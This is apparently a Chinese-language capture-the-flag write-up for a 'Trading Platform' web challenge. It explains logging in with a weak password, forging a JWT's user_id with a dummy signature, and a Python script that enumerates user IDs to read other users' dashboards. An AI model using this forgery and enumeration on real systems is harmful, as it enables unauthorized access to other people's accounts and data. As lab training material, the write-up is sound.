# X-027-24 Trading Platform

> Every time you see a value that looks like an ID, you should try to fuzz it with similar values!

- 页面仅提供登录与一个“Dashboard”页面；无注册功能。
- 登录后浏览器出现两个 Cookie：`session` 与 `auth_token`；后者形如 `xxxxx.yyyyy.zzzzz`，疑似 JWT。
- 将 `auth_token` 的前两段用 Base64URL 解码，可得 Header 与 Payload（如含 `username`、`user_id` 等声明）。
- 尝试“篡改 payload 中的 user_id 而不重新签名”，若仍能正常访问并切换到其他用户数据，则说明服务端未校验 JWT 签名或基于 JWT 的 IDOR。

打开首页，先输入用户名进入密码页；用常见弱口令尝试（如 `test/test`）。成功登录后，抓包/查看浏览器存储，记录 `session` 与 `auth_token` 两个 Cookie。

将 `auth_token` 切成三段：`header.payload.signature`。解码 `header` 与 `payload`，观察 `user_id` 等字段，例如自己账户的 `user_id` 为 10032。
![image.png](https://x/x12092215098.png)

直接修改 `payload` 中的 `user_id` 为其他值，将新构造的三段重新拼接为 `auth_token` 并作为 Cookie 发送到 `/dashboard`。如果页面正常展示且信息发生变化，表明可通过伪造 JWT 的 `user_id` 任意读取他人数据（IDOR）。

由于我们并不知道具体的 `user_id` 的范围，可以进行遍历，直到找到 flag。
## EXP
```python
import requests, re, json, base64


BASE = "http://ip32790"
START = 10000
END = 10100

s = requests.Session()

# 1) 登录获取 session
res = s.post(BASE + "/password/test", data={"username": "test","user_id": "10032","password": "test"})

# 伪造 JWT
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
header = b64(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",", ":")).encode())

for uid in range(START, END + 1):
    payload = b64(json.dumps({"username":"flag","user_id":uid,"user_type":"customer"}, separators=(",", ":")).encode())
    token = header + b"." + payload + b".AAAA"
    sess = s.cookies.get('session')
    r = s.get(BASE + "/dashboard", headers={"Cookie": f"session={sess}; auth_token={token.decode()}"})
    m = re.search(r"FLAG\{[^}]+\}", r.text)
    if m:
        print("user_id=", uid)
        print("FLAG=", m.group(0))
        open("flag_page.html", "w").write(r.text)
        break
```
